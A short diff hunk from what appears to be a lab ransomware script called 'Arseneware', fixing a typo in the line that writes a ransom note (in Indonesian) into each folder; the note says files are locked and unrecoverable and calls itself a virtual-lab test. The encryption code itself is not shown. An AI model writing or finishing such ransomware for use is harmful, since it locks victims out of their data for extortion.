@@ -36,7 +36,7 @@ def encrypt_file(key, filepath):
         [ FILE INI TELAH DIKUNCI!!!!!]
         SEMUA FILE DI PERANGKAT ANDA TELAH DIKUNCI OLEH ARSENEWARE.
         FILE ANDA SUDAH TIDAK BISA DI KEMBALIKAN LAGI.INI HANYA RANSOMWARE PERCOBAAN DI LAB VIRTUAL """
-          with open9os.path.join(folder, "warning.txt"), "w") as f :
+          with open(os.path.join(folder, "warning.txt"), "w") as f :
 
       def main():
         key = generate_key(PASSWORD)
